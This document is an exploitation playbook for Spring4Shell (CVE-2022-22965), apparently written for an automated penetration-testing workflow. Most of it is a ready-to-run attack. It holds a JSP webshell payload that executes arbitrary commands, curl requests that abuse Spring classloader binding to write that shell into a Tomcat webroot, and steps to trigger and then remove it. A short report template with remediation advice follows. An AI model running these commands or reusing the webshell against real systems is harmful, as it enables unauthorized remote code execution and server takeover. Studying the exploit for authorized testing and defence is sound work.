# Spring4Shell (CVE-2022-22965) — Exploitation Guide

## Overview
Spring4Shell is a Spring Framework RCE that can allow writing a JSP webshell on
Apache Tomcat when specific conditions are met (WAR deployment, Java 9+, etc.).

## Prerequisites
```bash
apt-get install -y jq
# Optional: nuclei for detection
nuclei -version
```

## Phase 1: Fingerprinting & Preconditions
```bash
# Check response headers for Spring/Tomcat hints
curl -s -I https://TARGET/ | tee /workspace/output/TARGET_spring_headers.txt

# Check for exposed actuator (if accessible)
curl -s https://TARGET/actuator | tee /workspace/output/TARGET_actuator.txt
```

## Phase 2: Automated Detection
```bash
nuclei -t cves/2022/CVE-2022-22965.yaml -u https://TARGET \
  -o /workspace/output/TARGET_spring4shell_nuclei.txt
```

## Phase 3: Manual Exploitation (JSP Webshell)
```bash
TARGET_URL="https://TARGET/APP_PATH"

PAYLOAD='<% if ("cmd".equals(request.getParameter("cmd"))) { java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %>'

curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.pattern=$PAYLOAD" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" \
  | tee /workspace/output/TARGET_spring4shell_post.txt

# Trigger the shell
curl -s "https://TARGET/shell.jsp?cmd=id" \
  | tee /workspace/output/TARGET_spring4shell_rce.txt
```

## Phase 4: Cleanup
```bash
# Remove the JSP shell if created
curl -s "https://TARGET/shell.jsp?cmd=rm%20-f%20webapps/ROOT/shell.jsp"
```

## Report Template

```
Target: TARGET
Vulnerability: Spring4Shell (CVE-2022-22965)
Assessment Date: <DATE>

## Evidence
- Detection output: /workspace/output/TARGET_spring4shell_nuclei.txt
- Exploit response: /workspace/output/TARGET_spring4shell_post.txt
- Command output: /workspace/output/TARGET_spring4shell_rce.txt

## Impact
- Remote code execution
- Arbitrary file write to webroot

## Recommendations
1. Upgrade Spring Framework to fixed versions
2. Use Tomcat + JVM configurations that block classloader binding
3. Enforce strict input binding (disallow class.* parameters)
4. Limit write permissions on webroot
```

## Output Files
- `/workspace/output/TARGET_spring_headers.txt` — header fingerprinting
- `/workspace/output/TARGET_actuator.txt` — actuator response
- `/workspace/output/TARGET_spring4shell_nuclei.txt` — nuclei detection
- `/workspace/output/TARGET_spring4shell_rce.txt` — command output

indicators: spring4shell, cve-2022-22965, spring rce, spring mvc rce, tomcat jsp, classloader
